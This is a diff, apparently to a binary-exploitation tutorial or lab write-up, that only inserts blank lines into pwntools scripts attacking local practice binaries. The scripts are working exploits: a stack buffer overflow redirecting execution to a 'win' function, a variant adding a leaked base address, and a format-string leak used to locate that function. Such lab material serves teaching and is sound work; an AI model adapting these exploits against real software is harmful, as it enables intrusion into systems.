@@ -153,11 +153,15 @@ from pwn import *
 p = process('./vuln-1.o')
 
 send = b"A" * 28 + p32(0x08049192)
+
 p.sendline(b"")
+
 p.sendline(send)
 
 p.interactive()
 ```
+
+
 
 
 
@@ -198,8 +202,11 @@ win_addres = 0x000011c9
 win_addres = base_addres + win_addres
 
 send = b"A" * 28 + p32(win_addres)
+
 p.sendline(b"")
+
 p.sendline(send)
+
 p.interactive()
 ```
 
@@ -251,7 +258,9 @@ p = process('./vuln-2.o')
 p.sendline("%p" * 7)
 
 data = p.readline()
+
 data = data.split(b"0x")
+
 for i in range(len(data)):
     log.info("{} {}".format(i, data[i]))
 ```
@@ -276,15 +285,20 @@ p = process('./vuln-2.o')
 p.sendline("%p" * 7)
 
 data = p.readline()
+
 data = data.split(b"0x")
+
 for i in range(len(data)):
     log.info("{} {}".format(i, data[i]))
 
 some_addr = int(data[3],16)
+
 offset = 0x37
+
 win_addres = some_addr - offset
 
 log.success("WIN AT: 0x%08x" % win_addres)
+
 send = b"A" * 28 + p32(win_addres)
 
 p.sendline(send)
